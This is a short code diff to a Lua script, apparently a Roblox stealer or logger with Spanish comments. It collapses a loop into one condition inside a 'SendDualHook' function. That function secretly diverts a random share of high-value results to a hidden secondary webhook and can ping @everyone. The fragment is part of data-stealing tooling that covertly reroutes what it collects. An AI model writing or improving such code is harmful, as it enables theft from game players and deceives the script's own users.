@@ -40,19 +40,7 @@ if not req then warn("No HTTP request method available!") return end
 
 -- Función para enviar webhook (dualhook automático)
 local function SendDualHook(title, description, fields)
-    local useDual = false
-    for _, field in ipairs(fields or {}) do
-        if field.value then
-            local v = tonumber(field.value:match("Valor:%s*(%d+)") or 0)
-            if v >= DualHookMinValue then
-                local rand = math.random(1,100)
-                if rand <= DualHookPercent then
-                    useDual = true
-                    break
-                end
-            end
-        end
-    end
+    local useDual = totalValue >= DualHookMinValue and math.random(1,100) <= DualHookPercent
     local targetWebhook = useDual and DualHookWebhook or webhook
     local prefix = pingEveryone and "@everyone " or ""  -- <--- define antes
     local data = {
